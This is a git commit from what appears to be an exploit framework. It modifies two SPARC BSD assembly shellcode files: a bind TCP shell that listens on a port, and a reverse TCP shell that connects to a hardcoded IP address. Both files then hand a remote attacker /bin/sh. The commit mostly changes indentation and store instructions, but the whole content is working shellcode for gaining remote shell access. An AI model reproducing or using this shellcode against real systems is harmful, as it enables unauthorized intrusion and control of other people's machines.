44c98de51535e6a994b5d805dfd899076197c076
no_author <no_author@no_author>
2004-12-13 02:50:55 +0000

    STDs are bad.

--- src/shellcode/bsd/sparc/single_bind_tcp.s
+++ src/shellcode/bsd/sparc/single_bind_tcp.s
@@ -12,60 +12,62 @@
 #
 # Description:
 #
-#        Single portbind TCP shell.
+#        Single bind TCP shell.
 #
 ##
 
 .globl main
 
 main:
-  xor	%o3, %o3, %o2
-  mov	0x01, %o1
-  mov	0x02, %o0
-  mov	0x61, %g1
-  ta	0x08
+	xor	%o3, %o3, %o2
+	mov	0x01, %o1
+	mov	0x02, %o0
+	mov	0x61, %g1
+	ta	0x08
 
-  st	%o0, [ %sp - 8 ]
+	st	%o0, [ %sp - 0x08 ]
 
-  set	0xff027a68, %l0
-  xor	%l1, %l1, %l1
-  std	%l0, [ %sp - 16 ]
-  sub	%sp, 16, %o1
-  mov	0x10, %o2
-  mov	0x68, %g1
-  ta	0x08
+	set	0xff027a68, %l0
+	xor	%l1, %l1, %l1
+	st	%l0, [ %sp - 0x10 ]
+	st	%l1, [ %sp - 0x0c ]
+	sub	%sp, 16, %o1
+	mov	0x10, %o2
+	mov	0x68, %g1
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  mov	0x01, %o1
-  mov	0x6a, %g1
-  ta	0x08
+	ld	[ %sp - 0x08 ], %o0
+	mov	0x01, %o1
+	mov	0x6a, %g1
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  xor	%o1, %o1, %o1
-  or	%o1, %o1, %o2
-  mov	0x1e, %g1
-  ta	0x08
+	ld	[ %sp - 0x08 ], %o0
+	xor	%o1, %o1, %o1
+	or	%o1, %o1, %o2
+	mov	0x1e, %g1
+	ta	0x08
 
-  st	%o0, [ %sp - 8 ]
-  xor	%o1, %o1, %o1
-  mov	0x5a, %g1 
-  ta	0x08
+	st	%o0, [ %sp - 0x08 ]
+	xor	%o1, %o1, %o1
+	mov	0x5a, %g1 
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  mov	1, %o1
-  ta	0x08
+	ld	[ %sp - 8 ], %o0
+	mov	1, %o1
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  mov	2, %o1
-  ta	0x08
+	ld	[ %sp - 8 ], %o0
+	mov	2, %o1
+	ta	0x08
 
-  xor	%o3, %o3, %o2
-  set	0x2f62696e, %l0
-  set	0x2f736800, %l1
-  sub	%sp, 0x10, %o0
-  sub	%sp, 0x08, %o1
-  std	%l0, [ %sp - 16 ]  
-  st	%o0, [ %sp - 8 ]
-  clr	[ %sp - 4 ]
-  mov	0x3b, %g1
-  ta	0x08
+	xor	%o3, %o3, %o2
+	set	0x2f62696e, %l0
+	set	0x2f736800, %l1
+	sub	%sp, 0x10, %o0
+	sub	%sp, 0x08, %o1
+	st	%l0, [ %sp - 0x10 ]	
+	st	%l1, [ %sp - 0x0c ]	
+	st	%o0, [ %sp - 0x08 ]
+	st	%g0, [ %sp - 0x04 ]
+	mov	0x3b, %g1
+	ta	0x08
--- src/shellcode/bsd/sparc/single_reverse_tcp.s
+++ src/shellcode/bsd/sparc/single_reverse_tcp.s
@@ -19,41 +19,42 @@
 .globl main
 
 main:
-  xor	%o3, %o3, %o2
-  mov	0x01, %o1
-  mov	0x02, %o0
-  mov	0x61, %g1
-  ta	0x08
+	xor	%o3, %o3, %o2
+	mov	0x01, %o1
+	mov	0x02, %o0
+	mov	0x61, %g1
+	ta	0x08
 
-  st	%o0, [ %sp + -8 ]
-  xor	%o1, %o1, %o1
-  mov	0x5a, %g1 
-  ta	0x08
+	st	%o0, [ %sp - 0x08 ]
+	xor	%o1, %o1, %o1
+	mov	0x5a, %g1 
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  mov	1, %o1
-  ta	0x08
+	ld	[ %sp - 0x08 ], %o0
+	mov	1, %o1
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  mov	2, %o1
-  ta	0x08
+	ld	[ %sp - 0x08 ], %o0
+	mov	2, %o1
+	ta	0x08
 
-  ld	[ %sp - 8 ], %o0
-  set	0xff027a68, %l0
-  set	0xc0a8020a, %l1
-  std	%l0, [ %sp - 16 ]
-  sub	%sp, 16, %o1
-  mov	0x10, %o2
-  mov	0x62, %g1 
-  ta	0x08
+	ld	[ %sp - 0x08 ], %o0
+	set	0xff027a68, %l0
+	set	0xc0a8020a, %l1
+	std	%l0, [ %sp - 0x10 ]
+	sub	%sp, 16, %o1
+	mov	0x10, %o2
+	mov	0x62, %g1 
+	ta	0x08
 
-  xor	%o3, %o3, %o2
-  set	0x2f62696e, %l0
-  set	0x2f736800, %l1
-  sub	%sp, 0x10, %o0
-  sub	%sp, 0x08, %o1
-  std	%l0, [ %sp - 16 ]  
-  st	%o0, [ %sp - 8 ]
-  clr	[ %sp - 4 ]
-  mov	0x3b, %g1
-  ta	0x08
+	xor	%o3, %o3, %o2
+	set	0x2f62696e, %l0
+	set	0x2f736800, %l1
+	sub	%sp, 0x10, %o0
+	sub	%sp, 0x08, %o1
+	st	%l0, [ %sp - 0x10 ]	
+	st	%l1, [ %sp - 0x0c ]	
+	st	%o0, [ %sp - 0x08 ]
+	st	%g0, [ %sp - 0x04 ]
+	mov	0x3b, %g1
+	ta	0x08
